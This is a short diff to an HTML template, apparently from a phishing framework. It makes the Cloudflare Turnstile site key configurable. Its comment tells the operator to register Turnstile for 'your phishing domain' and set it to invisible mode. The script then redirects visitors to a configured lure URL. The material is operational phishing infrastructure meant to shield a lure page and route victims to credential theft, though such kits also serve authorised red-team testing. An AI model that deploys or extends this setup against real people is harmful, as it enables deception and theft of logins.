@@ -2,7 +2,8 @@
     1. Create a new Turnstile Site in your Cloudflare dashboard
     2. Set 'Domain'' to your phishing domain e.g. my.phishing.domain.com.
     3. Set 'Widget Mode' to 'Invisible' to hide the Cloudflare widget and remove the interactive checks (change to managed if needed).
-    4. Copy the value of 'Site Key' and replace the value used in this file at `sitekey:`.
+    4. Set the site key using: config turnstile site_key YOUR_SITE_KEY
+    5. Enable turnstile using: config turnstile enabled true
 -->
 
 <html>
@@ -18,7 +19,7 @@ Loading...
 <script>
 turnstile.ready(function () {
         turnstile.render('#cf-turnstile', {
-            sitekey: '1x00000000000000000000BB', // replace this with your own sitekey
+            sitekey: '{turnstile_site_key}', // This will be replaced with the configured site key
             callback: function(token) {
                 window.location.assign({lure_url_js});
             },
